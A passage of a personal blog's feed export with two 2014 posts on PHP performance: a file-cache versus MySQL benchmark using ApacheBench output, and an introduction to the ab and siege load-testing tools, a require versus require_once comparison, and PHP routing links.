<p>####remember install pymongo &amp;&amp; run mongodb</p>
<p><br></p>
<h1 id="0x05-License"><a href="#0x05-License" class="headerlink" title="0x05.License"></a>0x05.License</h1><hr>


<p>####GPL</p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草，转载请注明出处-http-homeway-me-2014-08-28-mongosion"><a href="#本文出自-夏日小草，转载请注明出处-http-homeway-me-2014-08-28-mongosion" class="headerlink" title="本文出自 夏日小草，转载请注明出处:http://homeway.me/2014/08/28/mongosion/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>，转载请注明出处:<a href="http://homeway.me/2014/08/28/mongosion/">http://homeway.me/2014/08/28/mongosion/</a></h5><p><br></p>
<p>-by 小草<br>2014-08-28 </p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[代码性能-php(二)]]></title>
      <url>http://homeway.me/2014/07/05/code-performance-php-2/</url>
      <content type="html"><![CDATA[<p><br></p>
<h5 id="The-artile-is-about-php-cache-and-mysql-speed"><a href="#The-artile-is-about-php-cache-and-mysql-speed" class="headerlink" title="The artile is about php cache and mysql speed."></a>The artile is about php cache and mysql speed.</h5><h5 id="Test-the-speed-of-mysql-and-cache-in-the-same-conditions"><a href="#Test-the-speed-of-mysql-and-cache-in-the-same-conditions" class="headerlink" title="Test the speed of mysql and cache in the same conditions."></a>Test the speed of mysql and cache in the same conditions.</h5><h5 id="First-I-test-insert-select-update-3-times-and-then-test-each-a-time"><a href="#First-I-test-insert-select-update-3-times-and-then-test-each-a-time" class="headerlink" title="First I test insert,select,update 3 times and then, test each a time."></a>First I test insert,select,update 3 times and then, test each a time.</h5><a id="more"></a>
<p><br></p>
<p>(Today’s all code is here <a href="https://static.blog.homeway.me/work%2F2014-09-06-mysql-vs-cache.zip" target="_blank" rel="external">http://77l5jp.com1.z0.glb.clouddn.com/work%2F2014-09-06-mysql-vs-cache.zip</a>)</p>
<p>Tool: </p>
<p>Apache Benchmark And Siege (<a href="http://homeway.me/2014/09/04/%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD-php(%E4%B8%80">about ‘ab’  and ‘siege’</a> )</p>
<p>model:</p>
<ul>
<li><p>insert、select、update x100loop x100get</p>
</li>
<li><p>insert x200loop x200get</p>
</li>
<li><p>select x200loop x200get</p>
</li>
<li><p>update x200loop x200get</p>
</li>
</ul>
<h1 id="0x01-System-Environment"><a href="#0x01-System-Environment" class="headerlink" title="0x01.System Environment"></a>0x01.System Environment</h1><pre><code>- system

MAC os
Software  OS X 10.9.4 (13E28)
Processor  2.4 GHz Intel Core i5
Memory  8 GB 1600 MHz DDR3
250GB SSD

- environment
xampp 1.8.3
Apache/2.4.9
PHP Version 5.5.11
mysqlnd 5.0.11-dev - 20120503 - (mysql is empty)
</code></pre><h1 id="0x02-Code："><a href="#0x02-Code：" class="headerlink" title="0x02.Code："></a>0x02.Code：</h1><blockquote>
<p>cache.php</p>
</blockquote>
<pre><code>&lt;?php
require &#39;src/cache.class.php&#39;;
$cache = new SimpleCache();

$cache-&gt;cache_path = &#39;cache/&#39;;
$cache-&gt;cache_time = 3600;

for ($i=1; $i &lt; 100 ; $i++) { 

    $key = md5( uniqid().time() ) ;
    $date = time();

    //insert
    $save = $cache-&gt;set_cache( $key, $data);
    //get
    $get = $cache-&gt;get_cache( $key );
    //update
    $update = $cache-&gt;set_cache( $key, $data);
}

exit();
?&gt;
</code></pre><p>cache.class.php is sample cache class， every key create a ‘key.data’ file, nothing special。</p>
<p><br><hr></p>
<blockquote>
<p>mysql.php</p>
</blockquote>
<pre><code>&lt;?php

$con = mysql_connect(&quot;localhost&quot;,$user,$pwd);
if (!$con) {
      die(&#39;Could not connect: &#39; . mysql_error());
}

mysql_select_db(&#39;phpcache&#39;,$con);

for ($i=1; $i &lt; 100 ; $i++) { 

    $time = time();

    $insert = &quot;INSERT INTO `cache`( `time` ) VALUES ( &#39;$time&#39; )&quot;;

    $select = &quot;SELECT * FROM `cache` WHERE `time` = &#39;$time&#39;&quot;;

    $times=$time+1;

    $update = &quot;UPDATE `cache` SET `cache`=&#39;$times&#39; WHERE `time`=&#39;$time&#39;&quot;;

    $insert_result = mysql_query($insert);

    $select_result = mysql_query($select);

    $update_result = mysql_query($update);

}
?&gt;
</code></pre><blockquote>
<p>all ready. fire!!</p>
</blockquote>
<h1 id="0x03-TEST1-gt-insert、select、update-x100-Loop-x100-GET"><a href="#0x03-TEST1-gt-insert、select、update-x100-Loop-x100-GET" class="headerlink" title="0x03. TEST1 =&gt; insert、select、update x100 Loop x100 GET"></a>0x03. TEST1 =&gt; insert、select、update x100 Loop x100 GET</h1><h4 id="first-test"><a href="#first-test" class="headerlink" title="first test"></a>first test</h4><blockquote>
<p>ab -n 100 -c 10 <a href="http://127.0.0.1/phpcache/cache.php" target="_blank" rel="external">http://127.0.0.1/phpcache/cache.php</a></p>
</blockquote>
<p>####result:</p>
<pre><code>This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking 127.0.0.1 (be patient).....done

Server Software:        Apache/2.4.9
Server Hostname:        127.0.0.1
Server Port:            80

Document Path:          /phpcache/cache.php
Document Length:        27522 bytes

Concurrency Level:      10
Time taken for tests:   3.543 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      2773500 bytes
HTML transferred:       2752200 bytes
Requests per second:    28.22 [#/sec] (mean)
Time per request:       354.349 [ms] (mean)
Time per request:       35.435 [ms] (mean, across all concurrent requests)
Transfer rate:          764.36 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   1.1      0      11
Processing:   135  347 138.3    339     730
Waiting:       36  101  44.8     80     204
Total:        136  347 138.5    339     730

Percentage of the requests served within a certain time (ms)
      50%    339
      66%    420
      75%    434
      80%    473
      90%    530
      95%    583
      98%    624
      99%    730
     100%    730 (longest request)

     all 10198 records
</code></pre><blockquote>
<p>ab -n 100 -c 10 <a href="http://127.0.0.1/phpcache/mysql.php" target="_blank" rel="external">http://127.0.0.1/phpcache/mysql.php</a></p>
</blockquote>
<p>####result:</p>
<pre><code>This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking 127.0.0.1 (be patient).....done

Server Software:        Apache/2.4.9
Server Hostname:        127.0.0.1
Server Port:            80

Document Path:          /phpcache/mysql.php
Document Length:        0 bytes

Concurrency Level:      10
Time taken for tests:   37.934 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      23200 bytes
HTML transferred:       0 bytes
Requests per second:    2.64 [#/sec] (mean)
Time per request:       3793.356 [ms] (mean)
Time per request:       379.336 [ms] (mean, across all concurrent requests)
Transfer rate:          0.60 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       0
Processing:  1229 3790 1623.9   4030    6359
Waiting:     1229 3790 1623.9   4030    6359
Total:       1230 3790 1623.9   4030    6359

Percentage of the requests served within a certain time (ms)
      50%   4030
      66%   4650
      75%   5187
      80%   5793
      90%   6293
      95%   6348
      98%   6356
      99%   6359
     100%   6359 (longest request)

all 10198 records
</code></pre><p><br></p>
<p><hr><br><br></p>
<h4 id="second-test（Without-clean-created-file）"><a href="#second-test（Without-clean-created-file）" class="headerlink" title="second test（Without clean created file）"></a>second test（Without clean created file）</h4><blockquote>
<p>cache.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   7.518 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      23200 bytes
HTML transferred:       0 bytes
Requests per second:    13.30 [#/sec] (mean)
Time per request:       751.756 [ms] (mean)
Time per request:       75.176 [ms] (mean, across all concurrent requests)
Transfer rate:          3.01 [Kbytes/sec] received

Percentage of the requests served within a certain time (ms)
      50%    591
      66%    636
      75%    682
      80%    695
      90%    752
      95%    795
      98%    859
      99%    882
     100%    882 (longest request)

 all 19800 records    
</code></pre><blockquote>
<p>mysql.php     </p>
</blockquote>
<p>####result:    </p>
<pre><code> Concurrency Level:      10
Time taken for tests:   89.448 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      23200 bytes
HTML transferred:       0 bytes
Requests per second:    1.12 [#/sec] (mean)
Time per request:       8944.776 [ms] (mean)
Time per request:       894.478 [ms] (mean, across all concurrent requests)
Transfer rate:          0.25 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       0
Processing:  6474 8939 1506.3   9314   11180
Waiting:     6474 8938 1506.3   9314   11179
Total:       6474 8939 1506.2   9314   11180

Percentage of the requests served within a certain time (ms)
      50%   9314
      66%   9722
      75%  10388
      80%  10701
      90%  11058
      95%  11148
      98%  11167
      99%  11180
     100%  11180 (longest request)

all 20010 records
</code></pre><p><br></p>
<p><hr><br><br>    </p>
<h4 id="third-test（Without-clean-created-file）"><a href="#third-test（Without-clean-created-file）" class="headerlink" title="third test（Without clean created file）"></a>third test（Without clean created file）</h4><blockquote>
<p>cache.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   8.563 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      23200 bytes
HTML transferred:       0 bytes
Requests per second:    11.68 [#/sec] (mean)
Time per request:       856.292 [ms] (mean)
Time per request:       85.629 [ms] (mean, across all concurrent requests)
Transfer rate:          2.65 [Kbytes/sec] received

Percentage of the requests served within a certain time (ms)
      50%    838
      66%    875
      75%    899
      80%    907
      90%    968
      95%   1007
      98%   1034
      99%   1034
     100%   1034 (longest request)

all 29362 records(-&gt;_-&gt; when I get folder info, it`s a litte slow)
</code></pre><blockquote>
<p>mysql.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   146.047 seconds
Complete requests:      100
Failed requests:        0
Write errors:           0
Total transferred:      23200 bytes
HTML transferred:       0 bytes
Requests per second:    0.68 [#/sec] (mean)
Time per request:       14604.688 [ms] (mean)
Time per request:       1460.469 [ms] (mean, across all concurrent requests)
Transfer rate:          0.16 [Kbytes/sec] received

Percentage of the requests served within a certain time (ms)
      50%  14514
      66%  14853
      75%  15347
      80%  16788
      90%  18805
      95%  18832
      98%  18841
      99%  18843
     100%  18843 (longest request)

 all 30141 records
</code></pre><p><br></p>
<p>Obviously, mysql is slower then cache so much.</p>
<p>See here:</p>
<p><img src="https://static.blog.homeway.me/blog%2Fcache%26mysql-speed.png" alt="mysql &amp; cache speed"></p>
<hr>

<h1 id="0x04-TEST2-gt-insert-x100-Loop-x200-GET"><a href="#0x04-TEST2-gt-insert-x100-Loop-x200-GET" class="headerlink" title="0x04. TEST2 =&gt; insert x100 Loop x200 GET"></a>0x04. TEST2 =&gt; insert x100 Loop x200 GET</h1><blockquote>
<p>cache.php (ab -n 200 -c 10 <a href="http://127.0.0.1/phpcache/cache.php" target="_blank" rel="external">http://127.0.0.1/phpcache/cache.php</a>)</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   6.775 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes
Requests per second:    29.52 [#/sec] (mean)
Time per request:       338.728 [ms] (mean)
Time per request:       33.873 [ms] (mean, across all concurrent requests)
Transfer rate:          6.69 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.0      0       0
Processing:    87  335  96.7    357     530
Waiting:       87  335  96.4    355     530
Total:         87  335  96.7    357     531

Percentage of the requests served within a certain time (ms)
      50%    357
      66%    385
      75%    401
      80%    409
      90%    436
      95%    456
      98%    478
      99%    523
     100%    531 (longest request)
</code></pre><blockquote>
<p>mysql.php (ab -n 200 -c 10 <a href="http://127.0.0.1/phpcache/mysql.php" target="_blank" rel="external">http://127.0.0.1/phpcache/mysql.php</a>)</p>
</blockquote>
<pre><code>Concurrency Level:      10
Time taken for tests:   1.179 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes    
Requests per second:    169.57 [#/sec] (mean)
Time per request:       58.972 [ms] (mean)
Time per request:       5.897 [ms] (mean, across all concurrent requests)
Transfer rate:          38.42 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       1
Processing:    27   58  36.7     42     226
Waiting:       27   58  36.7     42     226
Total:         28   58  36.7     42     226

Percentage of the requests served within a certain time (ms)
      50%     42
      66%     55
      75%     63
      80%     72
      90%    116
      95%    141
      98%    173
      99%    208
     100%    226 (longest request)
</code></pre><h5 id="gt-From-the-result-we-can-see-that-insert-data-into-msyql-or-writer-into-disk-is-quickly-And-mysql-is-more-quick-than-disk-Than-we-can-find-a-way-to-save-time-save-cache-in-a-file-not-create-a-file-for-each-data"><a href="#gt-From-the-result-we-can-see-that-insert-data-into-msyql-or-writer-into-disk-is-quickly-And-mysql-is-more-quick-than-disk-Than-we-can-find-a-way-to-save-time-save-cache-in-a-file-not-create-a-file-for-each-data" class="headerlink" title="=&gt; From the result, we can see that, insert data into msyql or writer into disk is quickly. And mysql is more quick than disk. Than we can find a way to save time, save cache in a file not create a file for each data."></a>=&gt; From the result, we can see that, insert data into msyql or writer into disk is quickly. And mysql is more quick than disk. Than we can find a way to save time, save cache in a file not create a file for each data.</h5><p><br></p>
<p><hr><br><br></p>
<h1 id="0x04-TEST3-gt-select-x100-Loop-x200-GET-select-a-does-not-existed-data"><a href="#0x04-TEST3-gt-select-x100-Loop-x200-GET-select-a-does-not-existed-data" class="headerlink" title="0x04. TEST3 =&gt; select x100 Loop x200 GET(select a does not existed data)"></a>0x04. TEST3 =&gt; select x100 Loop x200 GET(select a does not existed data)</h1><blockquote>
<p>cache.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   0.201 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes
Requests per second:    993.31 [#/sec] (mean)
Time per request:       10.067 [ms] (mean)
Time per request:       1.007 [ms] (mean, across all concurrent requests)
Transfer rate:          225.05 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       1
Processing:     4   10   1.8     10      14
Waiting:        4   10   1.8     10      14
Total:          4   10   1.8     10      14

Percentage of the requests served within a certain time (ms)
      50%     10
      66%     11
      75%     11
      80%     11
      90%     12
      95%     13
      98%     14
      99%     14
     100%     14 (longest request)

so quickly!!
</code></pre><blockquote>
<p>mysql.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   70.006 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes
Requests per second:    2.86 [#/sec] (mean)
Time per request:       3500.306 [ms] (mean)
Time per request:       350.031 [ms] (mean, across all concurrent requests)
Transfer rate:          0.65 [Kbytes/sec] received

Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       0
Processing:  3000 3492 230.4   3438    4047
Waiting:     3000 3491 230.4   3438    4047
Total:       3000 3492 230.4   3438    4047

Percentage of the requests served within a certain time (ms)
      50%   3438
      66%   3628
      75%   3679
      80%   3701
      90%   3804
      95%   3898
      98%   4005
      99%   4033
     100%   4047 (longest request)

so slow!!
</code></pre><h4 id="The-results-are-very-clear-using-cache-to-search-data-is-qulcikly-than-mysql-select-a-lot-So-use-cache-to-save-some-data-reselected-many-times-will-be-more-quickly-so-much"><a href="#The-results-are-very-clear-using-cache-to-search-data-is-qulcikly-than-mysql-select-a-lot-So-use-cache-to-save-some-data-reselected-many-times-will-be-more-quickly-so-much" class="headerlink" title="The results are very clear, using cache to search data is qulcikly than mysql select a lot. So use cache to save some data reselected many times will be more quickly so much."></a>The results are very clear, using cache to search data is qulcikly than mysql select a lot. So use cache to save some data reselected many times will be more quickly so much.</h4><p><br></p>
<p><hr><br><br></p>
<h1 id="0x05-TEST4-gt-update-x100-Loop-x200-GET"><a href="#0x05-TEST4-gt-update-x100-Loop-x200-GET" class="headerlink" title="0x05. TEST4 =&gt; update x100 Loop x200 GET"></a>0x05. TEST4 =&gt; update x100 Loop x200 GET</h1><blockquote>
<p>cache.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   0.973 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes
Requests per second:    205.51 [#/sec] (mean)
Time per request:       48.660 [ms] (mean)
Time per request:       4.866 [ms] (mean, across all concurrent requests)
Transfer rate:          46.56 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       1
Processing:     9   47  54.9     23     267
Waiting:        9   47  54.9     23     267
Total:          9   47  54.9     23     267

Percentage of the requests served within a certain time (ms)
      50%     23
      66%     42
      75%     53
      80%     59
      90%    142
      95%    175
      98%    255
      99%    265
     100%    267 (longest request)
</code></pre><blockquote>
<p>mysql.php</p>
</blockquote>
<p>####result:</p>
<pre><code>Concurrency Level:      10
Time taken for tests:   1.411 seconds
Complete requests:      200
Failed requests:        0
Write errors:           0
Total transferred:      46400 bytes
HTML transferred:       0 bytes
Requests per second:    141.78 [#/sec] (mean)
Time per request:       70.532 [ms] (mean)
Time per request:       7.053 [ms] (mean, across all concurrent requests)
Transfer rate:          32.12 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       0
Processing:    39   70   7.9     68      97
Waiting:       39   70   7.9     68      97
Total:         39   70   8.0     68      97

Percentage of the requests served within a certain time (ms)
      50%     68
      66%     70
      75%     71
      80%     73
      90%     82
      95%     90
      98%     93
      99%     94
     100%     97 (longest request)
</code></pre><h4 id="From-it-so-clear-Because-when-mysql-update-a-data-it-must-seach-id-in-all-data-so-it-include-select"><a href="#From-it-so-clear-Because-when-mysql-update-a-data-it-must-seach-id-in-all-data-so-it-include-select" class="headerlink" title="From it, so clear. Because when mysql update a data, it must seach id in all data, so it include select."></a>From it, so clear. Because when mysql update a data, it must seach id in all data, so it include select.</h4><p><br></p>
<p><hr><br><br></p>
<h1 id="0x06-Find-a-solution"><a href="#0x06-Find-a-solution" class="headerlink" title="0x06.Find a solution"></a>0x06.Find a solution</h1><p>As we know, speed is always the most important element in developing a website especially for those high traffic database driven website. You can try to turn on query cache to speed up query.</p>
<p>To speed up query, enable the MySQL query cache, before that you need to set few variables in mysql configuration file (usually is my.cnf or my.ini)</p>
<p>first, set query_cache_type to 1. (There are 3 possible settings: 0 (disable / off), 1 (enable / on) and 2 (on demand).</p>
<pre><code>query-cache-type = 1
</code></pre><p>second, set query_cache_size to your expected size. I’d prefer to set it at 20MB.</p>
<pre><code>query-cache-size = 20M
</code></pre><p>So use cache in right time is a batter way to speed your website.</p>
<hr>

<p>some useful link to make your mysql qulickly.</p>
<p><a href="http://coolshell.cn/articles/1846.html" target="_blank" rel="external">http://coolshell.cn/articles/1846.html</a></p>
<p><a href="http://soft.chinabyte.com/database/55/12710055.shtml" target="_blank" rel="external">http://soft.chinabyte.com/database/55/12710055.shtml</a></p>
<p><a href="http://planetcassandra.org/nosql-performance-benchmarks/" target="_blank" rel="external">http://planetcassandra.org/nosql-performance-benchmarks/</a></p>
<p><br></p>
<p><hr><br><br></p>
<p>Please indicate the source:<a href="http://homeway.me/2014/07/05/code-performance-php-2">http://homeway.me/2014/07/05/code-performance-php-2</a></p>
<p><br></p>
<p>-By xiaocao</p>
<p> 2014-07-05 03:41:13</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[代码性能-php(一)]]></title>
      <url>http://homeway.me/2014/07/04/code-performance-php/</url>
      <content type="html"><![CDATA[<p>写了几天python.tornado，换下口味，看看教程，回顾下PHP。</p>
<p>本文关于php路由 &amp;&amp; php性能。 </p>
<h2 id="php性能测试"><a href="#php性能测试" class="headerlink" title="php性能测试"></a>php性能测试</h2><a id="more"></a>    
<hr>
<h3 id="0X01-Apache-Benchmark"><a href="#0X01-Apache-Benchmark" class="headerlink" title="0X01.Apache Benchmark"></a>0X01.Apache Benchmark</h3><p>ab [options] [full url]</p>
<blockquote>
<p>ab -n 100 -c 100 <a href="http://homeway.me/">http://homeway.me/</a></p>
</blockquote>
<pre><code>This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking homeway.me (be patient).....done


Server Software:
Server Hostname:        homeway.me
Server Port:            80

Document Path:          /
Document Length:        0 bytes

Concurrency Level:      100
Time taken for tests:   3.464 seconds
Complete requests:      100
Failed requests:        99

   (Connect: 0, Receive: 0, Length: 99, Exceptions: 0)
Write errors:           0
Non-2xx responses:      1
Total transferred:      1781365 bytes
HTML transferred:       1749568 bytes
Requests per second:    28.87 [#/sec] (mean)
Time per request:       3463.798 [ms] (mean)
Time per request:       34.638 [ms] (mean, across all concurrent requests)
Transfer rate:          502.23 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:      290 1454 179.6   1435    1610
Processing:   288 1091 404.5    988    2018
Waiting:      284  395  69.0    426     558
Total:        578 2545 475.4   2507    3462

Percentage of the requests served within a certain time (ms)
      50%   2507
      66%   2615
      75%   2737
      80%   2743
      90%   3448
      95%   3452
      98%   3457
      99%   3462
     100%   3462 (longest request)
</code></pre><p> 其中，-n 请求次数， -c 并发次数。</p>
<p> 0&lt;c&lt;=250 &amp; a&lt;50000</p>
<p> 主要用于测试相应速度，并发性相应等。</p>
<h3 id="0x02-Siege"><a href="#0x02-Siege" class="headerlink" title="0x02.Siege"></a>0x02.Siege</h3><p>######Information</p>
<p>siege主要测试服务器压力性能，并发性访问，dos攻击性能等。 </p>
<p>#####Install</p>
<p> mac下安装 brew install siege</p>
<p> centos源码安装 </p>
<pre><code> wget http://download.joedog.org/siege/siege-3.0.7.tar.gz
 tar -zvxf siege-3.0.7.tar.gz
 cd siege-3.0.7
 ./configure
 make &amp;&amp; make install
</code></pre><p>######Use</p>
<blockquote>
<p>siege -c 300 -r 100 -f url.txt</p>
</blockquote>
<p>说明：-c是并发量，-r是重复次数。url.txt就是一个文本文件，每行都是一个url，它会从里面随机访问的。</p>
<blockquote>
<p>siege -c 200 -r 10 <a href="http://homeway.me/">http://homeway.me/</a></p>
</blockquote>
<pre><code> Lifting the server siege...      done.

Transactions:                 321 hits
Availability:              100.00 %
Elapsed time:                5.06 secs
Data transferred:            1.53 MB
Response time:                1.70 secs
Transaction rate:           63.44 trans/sec
Throughput:                0.30 MB/sec
Concurrency:              107.99
Successful transactions:         321
Failed transactions:               0
Longest transaction:            3.85
Shortest transaction:            0.70
</code></pre><h2 id="php性能优化"><a href="#php性能优化" class="headerlink" title="php性能优化"></a>php性能优化</h2><hr>
<h4 id="Ox01-require-amp-amp-require-once-amp-amp-include-性能测试"><a href="#Ox01-require-amp-amp-require-once-amp-amp-include-性能测试" class="headerlink" title="Ox01.require &amp;&amp; require_once &amp;&amp; include 性能测试"></a>Ox01.require &amp;&amp; require_once &amp;&amp; include 性能测试</h4><p>对于文件包含测试，采用ab命令，php文件内容为。</p>
<blockquote>
<p>require_once.php</p>
</blockquote>
<pre><code>require_once (&#39;test/test/test/test1.php&#39;);
require_once (&#39;test/test/test/test2.php&#39;);
require_once (&#39;test/test/test/test3.php&#39;);
require_once (&#39;test/test/test/test4.php&#39;);
require_once (&#39;test/test/test/test5.php&#39;);
require_once (&#39;test/test/test/test6.php&#39;);
require_once (&#39;test/test/test/test7.php&#39;);
require_once (&#39;test/test/test/test8.php&#39;);
require_once (&#39;test/test/test/test9.php&#39;);
require_once (&#39;test/test/test/test10.php&#39;);
</code></pre><blockquote>
<p>ab -n 10000 -t 10 <a href="http://127.0.0.1/require_once.php" target="_blank" rel="external">http://127.0.0.1/require_once.php</a></p>
</blockquote>
<pre><code>This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking 127.0.0.1 (be patient)
Completed 5000 requests
Completed 10000 requests
Finished 10406 requests

Server Software:        Apache/2.4.9
Server Hostname:        127.0.0.1
Server Port:            80

Document Path:          /require_once.php
Document Length:        0 bytes

Concurrency Level:      1
Time taken for tests:   10.001 seconds
Complete requests:      10406
Failed requests:        0
Write errors:           0
Total transferred:      2414192 bytes
HTML transferred:       0 bytes
Requests per second:    1040.50 [#/sec] (mean)
Time per request:       0.961 [ms] (mean)
Time per request:       0.961 [ms] (mean, across all concurrent requests)
Transfer rate:          235.74 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.0      0       1
Processing:     1    1   0.1      1       5
Waiting:        0    1   0.1      1       5
Total:          1    1   0.2      1       5

Percentage of the requests served within a certain time (ms)
      50%      1
      66%      1
      75%      1
      80%      1
      90%      1
      95%      1
      98%      1
      99%      1
     100%      5 (longest request)
</code></pre><p>另一个</p>
<blockquote>
<p>require.php</p>
</blockquote>
<pre><code>require (&#39;test/test/test/test1.php&#39;);
require (&#39;test/test/test/test2.php&#39;);
require (&#39;test/test/test/test3.php&#39;);
require (&#39;test/test/test/test4.php&#39;);
require (&#39;test/test/test/test5.php&#39;);
require (&#39;test/test/test/test6.php&#39;);
require (&#39;test/test/test/test7.php&#39;);
require (&#39;test/test/test/test8.php&#39;);
require (&#39;test/test/test/test9.php&#39;);
require (&#39;test/test/test/test10.php&#39;);    
</code></pre><blockquote>
<p>ab -n 10000 -t 10 <a href="http://127.0.0.1/require.php" target="_blank" rel="external">http://127.0.0.1/require.php</a></p>
</blockquote>
<pre><code> This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking 127.0.0.1 (be patient)
Completed 5000 requests
Finished 9571 requests

Server Software:        Apache/2.4.9
Server Hostname:        127.0.0.1
Server Port:            80

Document Path:          /require.php
Document Length:        0 bytes

Concurrency Level:      1
Time taken for tests:   10.000 seconds
Complete requests:      9571
Failed requests:        0
Write errors:           0
Total transferred:      2220472 bytes    
HTML transferred:       0 bytes
Requests per second:    957.09 [#/sec] (mean)
Time per request:       1.045 [ms] (mean)
Time per request:       1.045 [ms] (mean, across all concurrent requests)
Transfer rate:          216.84 [Kbytes/sec] received

Connection Times (ms)
          min  mean[+/-sd] median   max
Connect:        0    0   0.1      0       4
Processing:     1    1   0.6      1      25
Waiting:        1    1   0.5      1      25
Total:          1    1   0.6      1      25

Percentage of the requests served within a certain time (ms)
      50%      1
      66%      1
      75%      1
      80%      1
      90%      1
      95%      1
      98%      2
      99%      4
     100%     25 (longest request)
</code></pre><p>用require相比requre_once,链接总时间一个10.000，一个10.001，差不多，但是，Connection Times就明显变大了。 </p>
<p>详细差别可以看这个: <a href="http://www.jb51.net/article/13968.htm" target="_blank" rel="external">http://www.jb51.net/article/13968.htm</a></p>
<p><br><br></p>
<h2 id="php路由设计"><a href="#php路由设计" class="headerlink" title="php路由设计"></a>php路由设计</h2><hr>
<p>####0x01. 路由实现</p>
<p>常见的重定向有.htaccess(apache)，nginx修改conf配置文件，要么就读取URI重写URI。</p>
<p>前面两类是用配置文件解决，后面一类是用代码模型来解决。</p>
<p>关于路由模型，我还是比较喜欢CI的MVC思想。</p>
<p><img src="http://xiaocao.u.qiniudn.com/blog%2Fmvc_modal.png" alt="MVC模型"></p>
<p>####0x02. .htaccess</p>
<p>windows不支持点开头的文件名，在linux里创建后下载到windows,我是直接在sublime里面创建这个文件。</p>
<p>.htaccess教程很多啦，也没有必要专门去学习。</p>
<p>下面是一个htaccess生成工具。</p>
<p><a href="http://www.htaccesseditor.com/sc.shtml" target="_blank" rel="external">http://www.htaccesseditor.com/sc.shtml</a></p>
<p>下面是一个.htaccess转成nginx下conf配置的工具。</p>
<p><a href="http://winginx.com/en/htaccess" target="_blank" rel="external">http://winginx.com/en/htaccess</a></p>
<p>####0x03. 读取URI</p>
<p>比较常见的是类似CI的 /index.php/class/function 型</p>
<p>教程也是有的。</p>
<p><a href="http://www.cnblogs.com/fredshare/archive/2012/09/17/2688944.html" target="_blank" rel="external">http://www.cnblogs.com/fredshare/archive/2012/09/17/2688944.html</a></p>
<p>今天在github上看到另一个，自主式获取。可以自由定义url，缺点就是，不能指定有需要时再加载php文件。</p>
<p>明天先研究下代码，然后修改下，优化下。</p>
<p><a href="https://github.com/anandkunal/ToroPHP" target="_blank" rel="external">https://github.com/anandkunal/ToroPHP</a></p>
<hr>

<p><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-07-04-code-performance-php"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-07-04-code-performance-php" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/07/04/code-performance-php/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/07/04/code-performance-php/">http://homeway.me/2014/07/04/code-performance-php/</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-07-04</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[php封装一个useragent包]]></title>
      <url>http://homeway.me/2014/06/21/php-package-for-useragent/</url>
